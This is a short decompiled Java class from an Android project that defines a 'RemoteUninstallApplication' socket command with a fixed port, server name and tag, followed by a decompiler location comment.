package com.vvt.polymorphic.command;

import com.fx.socket.TcpSocketCmd;

public class RemoteUninstallApplication
  extends TcpSocketCmd
{
  private static final long serialVersionUID = -8023544006060883068L;
  
  public RemoteUninstallApplication()
  {
    super(null, Boolean.class);
  }
  
  protected int getPort()
  {
    return 12514;
  }
  
  protected String getServerName()
  {
    return "vvt.polymorphic.server";
  }
  
  protected String getTag()
  {
    return "RemoteUninstallApplication";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/polymorphic/command/RemoteUninstallApplication.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */